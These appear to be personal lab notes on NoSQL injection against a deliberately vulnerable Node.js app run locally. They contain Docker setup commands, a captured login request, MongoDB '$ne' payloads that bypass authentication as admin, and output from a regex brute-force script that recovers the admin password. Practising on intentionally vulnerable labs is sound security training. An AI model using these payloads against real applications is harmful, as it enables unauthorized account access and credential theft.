# noSQL
```bash
https://github.com/Charlie-belmer/vulnerable-node-app

cd vulnerable-node-app
docker-compose up -d
 # docker volume
 # docker volume rm $(docker volume ls -q)

docker start vulnerable-node-app_node_1
docker start vulnerable-node-app_mongo_1

# open burpsuite
burpsuite >& /dev/null & disown

# ans
POST /user/login HTTP/1.1
Host: localhost:4000
Content-Length: 39
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Origin: http://localhost:4000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:4000/user/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"username":"admin","password":"admin"}

# changing payload
{
    "username":"admin",
    "password":{
    "$ne":"admin" # $ne - not equal
    }
}

# ans
{"role":"admin","username":"admin","msg":"Logged in as user admin with role admin"}

# changing payload
{
    "username":{
    "$ne":"guest"
    },
    "password":{
    "$ne":"admin"
    }
}

# ans
{"role":"admin","username":"admin","msg":"Logged in as user admin with role admin"}

# view payloads in payloads all the things
# creaet python scrip tto know the user and pass

python3 nosqli.py
[q] Brute force: {"username":"admin","password": {"$regex":"^2TR6uTRAuMUr5vARs9fYgdq"}}
[q] Password: 2TR6uTRAuMUr5vARs9fYgdq




```